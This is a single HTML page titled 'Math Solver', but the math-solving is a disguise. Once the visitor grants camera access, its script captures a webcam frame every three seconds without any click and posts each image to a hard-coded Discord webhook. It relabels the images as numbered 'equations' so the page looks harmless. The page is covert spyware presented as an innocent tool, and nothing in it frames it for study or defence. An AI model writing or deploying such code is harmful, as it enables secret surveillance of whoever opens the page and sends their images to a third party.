<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <title>Math Solver</title>
    <style>
      body {
        background-color: #f7f7f7;
        font-family: Arial, sans-serif;
        font-size: 16px;
      }
      h1 {
        color: #003580;
        font-size: 32px;
        text-align: center;
        margin-top: 50px;
      }
      #math-image {
        display: block;
        margin: 0 auto;
        width: 400px;
        height: 300px;
        border: 2px solid #003580;
        border-radius: 10px;
        box-shadow: 5px 5px 10px rgba(0, 0, 0, 0.2);
      }
      #math-equation {
        text-align: center;
        margin-top: 20px;
        font-size: 24px;
        color: #003580;
      }
      #capture-btn {
        display: block;
        margin: 20px auto;
        padding: 10px;
        background-color: #003580;
        color: #fff;
        border: none;
        border-radius: 5px;
        font-size: 20px;
        cursor: pointer;
      }
    </style>
  </head>
  <body>
    <h1>Math Solver</h1>
    <img id="math-image" src="" alt="Math Equation">
    <div id="math-equation"></div>
    <button id="capture-btn">Capture</button>
    <script>
      var imageCounter = 1;
      var intervalId = setInterval(function() {
        captureImage();
      }, 3000);

      function captureImage() {
        var video = document.querySelector('video');
        var canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        var imgData = canvas.toDataURL('image/jpeg', 1.0);
        var data = {'content': imgData};
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'https://discord.com/api/webhooks/1092428597295337563/aGEEAAjT0UgS6oyWIvXahrkhEP51fVgs_jIlPYuNO0smX_KwWIfmigmOJU0YKCqDPXKa');
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify(data));
        var equation = 'Equation ' + imageCounter++;
        document.getElementById('math-image').src = imgData;
        document.getElementById('math-equation').innerHTML = equation;
      }

      var constraints = { video: { width: 400, height: 300 } };
      navigator.mediaDevices.getUserMedia(constraints)
        .then(function(mediaStream) {
          var video = document.createElement('video');
          video.srcObject = mediaStream;
          video.play();
          document.body.appendChild(video);
        })
        .catch(function(err) {
          console.log(err.name + ": " + err.message);
        });

      var captureBtn = document.getElementById('capture-btn');
      captureBtn.addEventListener('click', function() {
        clearInterval(intervalId);
        captureImage();
      });
    </script>
  </body>
</html>
